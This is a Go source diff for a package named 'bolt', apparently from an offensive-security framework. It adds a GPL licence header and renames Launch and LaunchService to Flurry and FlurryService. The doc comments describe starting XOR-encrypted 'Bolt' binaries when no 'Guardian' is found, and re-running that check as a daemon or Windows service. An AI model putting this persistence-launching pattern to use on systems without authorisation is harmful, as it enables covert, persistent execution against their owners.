@@ -1,3 +1,19 @@
+// Copyright (C) 2020 - 2022 iDigitalFlame
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with this program.  If not, see <https://www.gnu.org/licenses/>.
+//
+
 package bolt
 
 import (
@@ -11,7 +27,7 @@ import (
 	"github.com/iDigitalFlame/xmt/util"
 )
 
-// Launch will start the process of locating and triggering a Guardian.
+// Flurry will start the process of locating and triggering a Guardian.
 //
 // If a Guardian is not detected, this function will attempt to start a Bolt
 // instance from the provided binary file list supplied.
@@ -20,7 +36,7 @@ import (
 // XOR encryption is used.
 //
 // If 'l' is nil, this will use the Pipe Linker.
-func Launch(l man.Linker, guard string, f []string, k []byte) {
+func Flurry(l man.Linker, guard string, f []string, k []byte) {
 	if len(f) == 0 {
 		return
 	}
@@ -49,7 +65,7 @@ func Launch(l man.Linker, guard string, f []string, k []byte) {
 	}
 }
 
-// LaunchService will start the process of locating and triggering a Guardian as
+// FlurryService will start the process of locating and triggering a Guardian as
 // a *nix daemon or a Windows service.
 //
 // If a Guardian is not detected, this function will attempt to start a Bolt
@@ -60,11 +76,11 @@ func Launch(l man.Linker, guard string, f []string, k []byte) {
 //
 // If 'l' is nil, this will use the Pipe Linker.
 //
-// The provided function arguments are the same as 'Launch' but with the added
-// service name (Windows only) and the time between Launch checks as a Duration.
-func LaunchService(t time.Duration, name string, l man.Linker, guard string, f []string, k []byte) {
+// The provided function arguments are the same as 'Flurry' but with the added
+// service name (Windows only) and the time between Flurry checks as a Duration.
+func FlurryService(t time.Duration, name string, l man.Linker, guard string, f []string, k []byte) {
 	device.DaemonTicker(name, t, func(_ context.Context) error {
-		Launch(l, guard, f, k)
+		Flurry(l, guard, f, k)
 		return nil
 	})
 }
